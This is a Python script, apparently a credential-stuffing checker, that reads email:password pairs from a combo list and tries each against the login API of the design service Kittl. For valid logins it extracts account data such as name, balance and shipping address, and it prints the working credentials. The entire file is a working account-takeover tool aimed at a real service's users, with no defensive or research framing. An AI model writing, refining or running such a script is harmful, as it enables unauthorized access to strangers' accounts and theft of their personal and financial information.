import requests
import json
import threading
from parser_kittl import parse_using_re

class Color:
    no_colored = "\033[0m"
    white_bold = "\033[1;37m"
    blue_bold = "\033[1;96m"
    green_bold = "\033[1;92m"
    red_bold = "\033[1;91m"
    yellow_bold = "\033[1;33m"

def brutter(user, password):
    data = {
        "email": user,
        "password": password
    }

    headers = {
        # Custom headers here
    }

    url = "https://api.kittl.com/sessions/create"
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 201:
        content_type = response.headers.get("Content-Type", "")
        if "application/json" in content_type:
            data = response.json()
        else:
            print(f"Unexpected content type: {content_type}")
            return

        data = json.dumps(data)

        name = parse_using_re(data, "name")
        followers = parse_using_re(data, "followerCount")
        following = parse_using_re(data, "followingCount")
        balance = parse_using_re(data, "balance")
        designCount = parse_using_re(data, "designsCount")
        createdAt = parse_using_re(data, "createdAt")
        address = parse_using_re(data, "shippingAddress")

        
        #print(f"{user}:{password} | Name:{name},Followers:{followers},Following:{following},Balance:{balance},Designs:{designCount},CreatedAt:{createdAt},Address:{address} |")
        print(f"{Color.green_bold}{user}:{password}{Color.no_colored}")
    elif response.status_code == 500:
        print(f"{Color.red_bold}Response [500] , SERVER DOWN .{Color.no_colored}")
        exit()

    else:
        print(f"{Color.blue_bold}{user}:{password}{Color.no_colored}")

with open("combos.txt", 'r', encoding='utf-8') as combo:
    lines = combo.readlines()
    for line in lines:
        parts = line.strip().split(":")
        if len(parts) == 2:
            user = parts[0]
            password = parts[1]
            brutter(user, password)
        else:
            continue
